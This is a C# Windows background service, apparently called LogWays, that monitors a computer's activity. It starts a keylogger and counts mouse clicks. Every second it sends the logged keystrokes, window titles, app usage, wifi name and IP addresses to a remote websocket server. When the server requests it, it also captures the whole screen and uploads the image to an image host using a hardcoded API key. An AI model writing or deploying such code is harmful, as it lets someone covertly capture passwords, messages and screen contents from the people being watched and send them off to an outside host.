using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Drawing.Imaging;

namespace LogWays;

public class Worker : BackgroundService
{
    const string WS_URI = false ? "ws://localhost:8392/socket" : "wss://ws.alimad.co/socket";
    static string ipa = "0.0.0.0";
    private System.Threading.Timer? _flushTimer;
    const double TOTAL_RAM = 8L * 1024 * 1024 * 1024;
    const int CPU_CORES = 8;
    uint last_process = 0;

    readonly Dictionary<int, double> lastCpu = [];
    readonly Dictionary<int, DateTime> lastTime = [];
    readonly string deviceName = Environment.MachineName;

    ClientWebSocket ws = null!;
    private readonly CancellationTokenSource wsCts = new();

    [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
    [DllImport("kernel32.dll")] static extern uint GetTickCount();
    [DllImport("user32.dll")] static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    [DllImport("user32.dll")] static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
    [DllImport("user32.dll")] static extern bool IsWindowVisible(IntPtr hWnd);
    [DllImport("user32.dll")] static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int maxLength);
    [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr hWnd, out RECT rect);
    [DllImport("user32.dll")] static extern IntPtr GetDesktopWindow();
    [StructLayout(LayoutKind.Sequential)] struct RECT { public int Left; public int Top; public int Right; public int Bottom; }

    delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
    public Worker()
    {
        KeyLogger.Start();
        MouseCounter.Start();
        Task.Run(GetPublicIpAsync);
        Task.Run(() => WsConnectLoopAsync(wsCts.Token));

        SessionLogger.StartSession();
        _flushTimer = new System.Threading.Timer(_ => SessionLogger.Flush(), null, 10_000, 10_000);
        AppDomain.CurrentDomain.ProcessExit += (_, __) => SessionLogger.Flush();
    }

    protected override async Task ExecuteAsync(CancellationToken token)
    {
        var sampleInterval = TimeSpan.FromSeconds(1);

        while (!token.IsCancellationRequested)
        {
            var sample = new Dictionary<string, object>();
            try
            {
                var hwnd = GetForegroundWindow();
                if (hwnd != IntPtr.Zero)
                {
                    _ = GetWindowThreadProcessId(hwnd, out uint pid);
                    var p = Process.GetProcessById((int)pid);

                    string iconBase64 = "";
                    if (last_process != pid)
                    {
                        var ico = GetAppIcon(p);
                        iconBase64 = ico != null ? IconToBase64(ico) : "none";
                    }
                    last_process = pid;

                    string name = p.ProcessName;
                    string title = p.MainWindowTitle;
                    long ramBytes = p.WorkingSet64;
                    double ramPercent = (ramBytes / TOTAL_RAM) * 100.0;

                    double nowCpu = p.TotalProcessorTime.TotalMilliseconds;
                    DateTime nowTime = DateTime.UtcNow;
                    double cpuPercent = 0.0;

                    if (lastCpu.TryGetValue(p.Id, out double prevCpu) && lastTime.TryGetValue(p.Id, out DateTime prevTime))
                    {
                        double cpuDelta = nowCpu - prevCpu;
                        double timeDelta = (nowTime - prevTime).TotalMilliseconds;
                        if (timeDelta > 0) cpuPercent = (cpuDelta / timeDelta) * 100.0 / CPU_CORES;
                    }

                    int battery = BatteryMonitor.GetBatteryPercent();
                    bool charge = BatteryMonitor.IsPluggedIn();

                    lastCpu[p.Id] = nowCpu;
                    lastTime[p.Id] = nowTime;

                    sample["device"] = deviceName;
                    sample["app"] = name;
                    sample["title"] = title;
                    sample["icon"] = iconBase64;
                    sample["ramPercent"] = Math.Round(ramPercent, 2);
                    sample["cpuPercent"] = Math.Round(cpuPercent, 2);
                    sample["batteryPercent"] = battery;
                    if (charge) sample["charging"] = true;
                    sample["wifi"] = WifiHelper.GetWifiName();
                    sample["isIdle"] = IsIdle();
                    string keys = KeyLogger.GetKeys();
                    sample["meta"] = GetWindowStatus();
                    sample["fullscreen"] = IsFullscreen(hwnd);
                    var (left, right) = IsSplitScreen(hwnd);
                    sample["splitLeft"] = left;
                    sample["splitRight"] = right;
                    sample["keys"] = keys;
                    sample["keysPressed"] = keys.Length;
                    sample["mouseClicks"] = MouseCounter.ResetClicks();
                    sample["isSleeping"] = hwnd == IntPtr.Zero;
                }
                else
                {
                    sample["device"] = deviceName;
                    sample["app"] = "";
                    sample["isIdle"] = true;
                    sample["isSleeping"] = true;
                }
                sample["localIp"] = GetLocalIPAddress();
            }
            catch (Exception ex)
            {
                sample["error"] = ex.Message;
            }

            SessionLogger.LogSample(sample);
            _ = SendWebSocketSampleAsync(sample);

            await Task.Delay(sampleInterval, token);
        }
    }
    static async Task<string> GetPublicIpAsync()
    {
        try
        {
            using var httpClient = new HttpClient();
            ipa = await httpClient.GetStringAsync("https://api.ipify.org");
            return ipa;
        }
        catch { return "0.0.0.0"; }
    }
    static string GetLocalIPAddress()
    {
        try
        {
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus != OperationalStatus.Up) continue;
                foreach (var ua in ni.GetIPProperties().UnicastAddresses)
                {
                    if (ua.Address.AddressFamily == AddressFamily.InterNetwork)
                        return ua.Address.ToString();
                }
            }
        }
        catch { }
        return "0.0.0.0";
    }
    static bool IsIdle()
    {
        LASTINPUTINFO lii = new LASTINPUTINFO { cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO)) };
        if (GetLastInputInfo(ref lii))
        {
            uint idleTime = (uint)Environment.TickCount - lii.dwTime;
            return idleTime > 60_000;
        }
        return false;
    }
    async Task SendWebSocketSampleAsync(Dictionary<string, object> sample)
    {
        try
        {
            if (ws == null || ws.State != WebSocketState.Open) return;
            var payload = JsonSerializer.Serialize(new { type = "sample", data = sample });
            var bytes = Encoding.UTF8.GetBytes(payload);
            await ws.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None);
        }
        catch { }
    }
    string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

    async Task WsConnectLoopAsync(CancellationToken ct)
    {
        string logPath = Path.Combine(desktopPath, "ws_errors.txt");

        while (!ct.IsCancellationRequested)
        {
            try
            {
                ws = new ClientWebSocket();
                await ws.ConnectAsync(new Uri(WS_URI), ct);
                var authMsg = JsonSerializer.Serialize(new { type = "auth", password = Passwords.WS_PASSWORD, device = deviceName });
                await ws.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(authMsg)), WebSocketMessageType.Text, true, ct);

                var buffer = new byte[1024 * 1024];
                while (ws.State == WebSocketState.Open && !ct.IsCancellationRequested)
                {
                    try
                    {
                        var result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), ct);
                        if (result.MessageType == WebSocketMessageType.Close) break;

                        using var doc = JsonDocument.Parse(Encoding.UTF8.GetString(buffer, 0, result.Count));
                        SessionLogger.LogWebSocketMessage("received", doc.RootElement.ToString());

                        if (doc.RootElement.TryGetProperty("type", out var t) && t.GetString() == "request")
                        {
                            string targetDevice = doc.RootElement.GetProperty("device").GetString() ?? "";
                            if (targetDevice == deviceName)
                            {
                                try
                                {
                                    string screenshotBase64 = TakeScreenshotBytes(out var bytes);

                                    string screenshotFile = Path.Combine(desktopPath, $"screenshot.png");

                                    string url = await UploadToImgBBAsync(bytes);
                                    string savedPath = ScreenshotSaver.SaveScreenshot(url, bytes, DateTime.UtcNow);
                                    SessionLogger.LogScreenshot(url);

                                    var payload = JsonSerializer.Serialize(new
                                    {
                                        type = "screenshot",
                                        time = DateTime.UtcNow,
                                        data = url,
                                        device = deviceName
                                    });
                                    var bytesToSend = Encoding.UTF8.GetBytes(payload);
                                    await ws.SendAsync(new ArraySegment<byte>(bytesToSend), WebSocketMessageType.Text, true, CancellationToken.None);
                                }
                                catch (Exception ex)
                                {
                                    await File.AppendAllTextAsync(logPath, $"[{DateTime.Now}] Send screenshot failed: {ex}\n");
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        await File.AppendAllTextAsync(logPath, $"[{DateTime.Now}] Receive/process failed: {ex}\n");
                    }
                }
            }
            catch (Exception ex)
            {
                await File.AppendAllTextAsync(logPath, $"[{DateTime.Now}] WS connection failed: {ex}\n");
            }
            finally
            {
                try { ws?.Abort(); ws?.Dispose(); } catch { }
            }

            await Task.Delay(2000, ct);
        }
    }

    static readonly HttpClient httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(15) };

    async Task<string> UploadToImgBBAsync(byte[] imageBytes)
    {
        var content = new MultipartFormDataContent();
        content.Add(new StringContent(Convert.ToBase64String(imageBytes)), "image");
        content.Add(new StringContent("0035f29ef2ddb2862584cd5114e4a7ee"), "key");
        using var response = await httpClient.PostAsync("https://api.imgbb.com/1/upload", content);
        response.EnsureSuccessStatusCode();
        using var doc = JsonDocument.Parse(await response.Content.ReadAsStringAsync());
        return doc.RootElement.GetProperty("data").GetProperty("url").GetString() ?? "";
    }

    string TakeScreenshotBytes(out byte[] bytes)
    {
        var bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
        using var bmp = new Bitmap(bounds.Width, bounds.Height);
        using var g = Graphics.FromImage(bmp);
        g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
        using var ms = new MemoryStream();
        bmp.Save(ms, ImageFormat.Png);
        bytes = ms.ToArray();
        return Convert.ToBase64String(bytes);
    }

    static Dictionary<string, bool> GetWindowStatus()
    {
        var map = new Dictionary<string, bool> {
        { "slack", false },
        { "discord", false },
        { "whatsapp.root", false },
        { "code", false },
        { "chrome", false },
        { "windowsterminal", false }
    };
        EnumWindows((h, l) =>
        {
            var sb = new StringBuilder(256);
            GetWindowText(h, sb, 256);
            string title = sb.ToString().ToLower();

            foreach (var k in map.Keys.ToList())
            {
                if (title.Contains(k)) map[k] = true;
            }

            return true;
        }, IntPtr.Zero);

        return map;
    }
    static bool IsFullscreen(IntPtr hWnd)
    {
        GetWindowRect(hWnd, out RECT r);
        IntPtr desktop = GetDesktopWindow();
        GetWindowRect(desktop, out RECT d);

        return r.Left <= d.Left && r.Top <= d.Top &&
               r.Right >= d.Right && r.Bottom >= d.Bottom;
    }
    static (bool left, bool right) IsSplitScreen(IntPtr hWnd)
    {
        GetWindowRect(hWnd, out RECT r);
        IntPtr desktop = GetDesktopWindow();
        GetWindowRect(desktop, out RECT d);
        int mid = (d.Right - d.Left) / 2;
        bool left = r.Left <= d.Left + 10 && r.Right <= mid + 15;
        bool right = r.Left >= mid - 15 && r.Right >= d.Right - 10;
        return (left, right);
    }
    static string CsvSafe(string s) => string.IsNullOrEmpty(s) ? "" : s.Contains(',') || s.Contains('"') || s.Contains('\n') ? $"\"{s.Replace("\"", "\"\"")}\"" : s;
    static Icon? GetAppIcon(Process p) { try { return Icon.ExtractAssociatedIcon(p.MainModule!.FileName!); } catch { return null; } }
    static string IconToBase64(Icon icon) { using var bmp = icon.ToBitmap(); using var ms = new MemoryStream(); bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png); return Convert.ToBase64String(ms.ToArray()); }
}
